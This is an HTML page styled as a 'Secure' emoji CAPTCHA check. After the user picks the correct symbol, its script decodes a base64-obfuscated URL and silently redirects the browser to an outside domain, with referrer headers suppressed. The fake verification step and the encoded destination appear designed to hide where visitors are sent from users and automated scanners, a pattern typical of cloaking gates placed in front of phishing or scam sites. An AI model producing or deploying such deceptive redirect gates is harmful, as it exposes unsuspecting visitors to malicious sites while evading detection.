<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<title>Secure</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">

<style>
*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Inter',sans-serif;
}

body{
height:100vh;
overflow:hidden;
display:flex;
align-items:center;
justify-content:center;
background:radial-gradient(circle at top,#1a1a2e,#0f0f0f 60%);
color:white;
}

/* Animated Glow Background */
body::before{
content:"";
position:absolute;
width:600px;
height:600px;
background:radial-gradient(circle,#6c5ce7,transparent 60%);
filter:blur(150px);
animation:moveGlow 10s infinite alternate ease-in-out;
z-index:0;
}

@keyframes moveGlow{
0%{transform:translate(-100px,-100px);}
100%{transform:translate(100px,100px);}
}

/* Card */
.card{
position:relative;
z-index:2;
background:rgba(255,255,255,0.05);
backdrop-filter:blur(20px);
padding:40px;
width:340px;
border-radius:24px;
text-align:center;
box-shadow:0 0 50px rgba(108,92,231,0.3);
animation:fadeIn 1s ease;
}

@keyframes fadeIn{
from{opacity:0;transform:translateY(20px)}
to{opacity:1;transform:translateY(0)}
}

.captcha-grid{
display:grid;
grid-template-columns:repeat(3,1fr);
gap:12px;
margin-bottom:20px;
}

.box{
background:rgba(255,255,255,0.07);
border-radius:14px;
padding:18px;
cursor:pointer;
transition:0.3s;
font-size:22px;
}

.box:hover{
background:rgba(108,92,231,0.4);
box-shadow:0 0 15px #6c5ce7;
transform:scale(1.05);
}

.loading{
display:none;
margin-top:15px;
}

.loader{
width:40px;
height:40px;
border:4px solid rgba(255,255,255,0.1);
border-top:4px solid #6c5ce7;
border-radius:50%;
margin:auto;
animation:spin 1s linear infinite;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

.credit{
margin-top:25px;
font-size:12px;
color:#aaa;
letter-spacing:2px;
}
</style>
</head>
<body>

<div class="card">

<div class="captcha-grid" id="captcha"></div>

<div class="loading" id="loading">
<div class="loader"></div>
</div>

<div class="credit">zyn</div>

</div>

<script>
// ===== CAPTCHA =====
const symbols=["⭐","🔷","🔥","🌙","⚡","💎","🎯","🚀","🌊"];
const correct="💎"; // simbol yang benar
const captcha=document.getElementById("captcha");

symbols.sort(()=>Math.random()-0.5);

symbols.forEach(sym=>{
const div=document.createElement("div");
div.className="box";
div.textContent=sym;

div.onclick=()=>{
if(sym===correct){
document.getElementById("loading").style.display="block";
captcha.style.display="none";

setTimeout(()=>{
const encoded="aHR0cHM6Ly9yYW16em9mZmNpYWxzdnIub3JhbmctZ2FudGVuZ2cuYml6Lmlk";
window.location.replace(atob(encoded));
},2000);

}else{
div.style.background="rgba(255,0,0,0.4)";
div.style.transform="scale(0.9)";
setTimeout(()=>{
div.style.background="rgba(255,255,255,0.07)";
div.style.transform="scale(1)";
},300);
}
};

captcha.appendChild(div);
});
</script>

</body>
</html>
